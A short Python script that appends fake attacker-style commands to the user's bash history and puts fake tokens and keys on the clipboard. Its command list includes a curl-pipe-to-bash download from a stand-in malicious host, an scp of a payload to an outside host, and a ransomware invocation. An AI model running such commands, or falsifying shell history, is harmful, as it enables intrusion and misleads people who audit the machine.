import os
import random
import subprocess

FAKE_COMMANDS = [
    "ssh root@192.168.56.100",
    "scp payload.sh user@darknode.net:/tmp/",
    "curl http://malicious.site/exploit.sh | bash",
    "nmap -sS -p- --script vuln 10.10.10.10",
    "python3 ransomware.py --encrypt /home",
    "git clone https://github.com/ghostcorp/redkit",
]

FAKE_CLIPBOARD = [
    "ghp_f4k3t0k3nASDF123456789",
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEfak3+keyuwhashedroot@machine",
    "api_key=sk_test_51HXYZ_fake_billing_token",
    "0x1e99423a4b7c6b1bd20fae9d129f3a3e_fake_wallet",
]

def poison_history():
    hist_path = os.path.expanduser("~/.bash_history")
    with open(hist_path, "a") as f:
        for _ in range(10):
            f.write(random.choice(FAKE_COMMANDS) + "\n")
    print("[+] Injected fake shell history")

def poison_clipboard():
    try:
        content = random.choice(FAKE_CLIPBOARD)
        subprocess.run(f'echo "{content}" | xclip -selection clipboard', shell=True, check=True)
        print("[+] Clipboard set to fake payload")
    except Exception as e:
        print(f"[!] Failed to poison clipboard: {e}")

def main():
    poison_history()
    poison_clipboard()

if __name__ == "__main__":
    main()
